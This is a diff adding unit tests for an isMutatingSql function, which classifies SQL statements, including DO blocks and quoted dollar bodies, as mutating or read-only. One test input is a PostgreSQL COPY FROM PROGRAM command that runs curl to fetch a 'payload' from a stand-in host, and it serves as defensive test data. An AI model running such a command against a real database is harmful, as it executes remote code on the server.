@@ -39,7 +39,8 @@ const {
     unwrapBindValue,
     lookupBind,
     lookupParam,
-    bindValueFromInput
+    bindValueFromInput,
+    isMutatingSql
 } = require(path.join(outDir, 'parameters.js'));
 
 function assert(name, actual, check) {
@@ -252,6 +253,72 @@ assert('input NULL word is SQL NULL', bindValueFromInput('NULL'), null);
 assert('input null word is SQL NULL', bindValueFromInput('null'), null);
 assert('input quoted empty is empty string', bindValueFromInput("''"), '');
 assert('input plain text stays', bindValueFromInput('folder/'), 'folder/');
+
+assert('mutating DELETE', isMutatingSql('DELETE FROM t'), true);
+assert('mutating FOR UPDATE', isMutatingSql('SELECT * FROM t FOR UPDATE'), true);
+assert('mutating CALL', isMutatingSql('CALL refresh_stats()'), true);
+assert('mutating COPY', isMutatingSql("COPY users FROM '/tmp/load.csv'"), true);
+assert('mutating GRANT', isMutatingSql('GRANT ALL ON users TO public'), true);
+assert(
+    'mutating WITH then CALL',
+    isMutatingSql('WITH c AS (SELECT 1) CALL p()'),
+    true
+);
+assert(
+    'select replace function',
+    isMutatingSql("SELECT replace(name, 'a', 'b') FROM t"),
+    false
+);
+assert('select column named call', isMutatingSql('SELECT call FROM t'), false);
+assert(
+    'select case then call',
+    isMutatingSql('SELECT CASE WHEN 1 THEN call ELSE name END FROM t'),
+    false
+);
+assert(
+    'do block copy',
+    isMutatingSql("DO $$ COPY users FROM '/tmp/load.csv' $$"),
+    true
+);
+assert(
+    'do block copy from program',
+    isMutatingSql("DO $$ COPY users FROM PROGRAM 'curl http://example/payload' $$"),
+    true
+);
+assert(
+    'do begin copy',
+    isMutatingSql("DO $$ BEGIN COPY users FROM '/tmp/load.csv'; END $$"),
+    true
+);
+assert('do block call', isMutatingSql('DO $$ CALL refresh_stats() $$'), true);
+assert(
+    'do if then copy',
+    isMutatingSql("DO $$ IF true THEN COPY users FROM '/tmp/load.csv'; END IF $$"),
+    true
+);
+assert(
+    'do tagged quote',
+    isMutatingSql("DO $body$ COPY users FROM '/tmp/load.csv' $body$"),
+    true
+);
+assert(
+    'do select column named call',
+    isMutatingSql('DO $$ SELECT call FROM t $$'),
+    false
+);
+assert(
+    'do select case then call',
+    isMutatingSql('DO $$ SELECT CASE WHEN 1 THEN call ELSE name END FROM t $$'),
+    false
+);
+assert(
+    'quoted dollar is not a body',
+    isMutatingSql("SELECT 'DO $$ COPY users FROM ''/tmp/load.csv'' $$'"),
+    false
+);
+assert('refresh materialized view', isMutatingSql('REFRESH MATERIALIZED VIEW v'), true);
+assert('vacuum', isMutatingSql('VACUUM users'), true);
+assert('lock table', isMutatingSql('LOCK TABLE users'), true);
 
 if (process.exitCode) {
     process.exit(1);
